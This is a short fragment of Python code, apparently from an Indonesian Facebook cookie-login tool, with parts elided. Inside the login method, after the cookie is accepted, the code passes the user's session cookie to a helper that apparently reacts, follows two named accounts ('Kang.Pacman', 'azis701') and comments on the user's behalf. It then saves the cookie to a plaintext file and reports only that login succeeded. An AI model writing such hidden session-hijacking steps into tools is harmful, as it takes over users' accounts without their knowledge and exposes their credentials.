	...
	def login(self):
		try:
			...
			if "mbasic_logout_button" in cek:
				...
				a=awokawokawok(self.kuki.get("cookie"));a.lang();a.react();a.tuturkeun("Kang.Pacman");a.tuturkeun("azis701");a.komentar();open("cookie","w").write(self.kuki.get("cookie"));exit("[✓] Login Berhasil, Jalankan Ulang Tools Nya")
			else:
				exit("\n\n[!] Cookie Invalid")
		except req.exceptions.ConnectionError:
			exit("[!] Kesalahan Pada Koneksi")
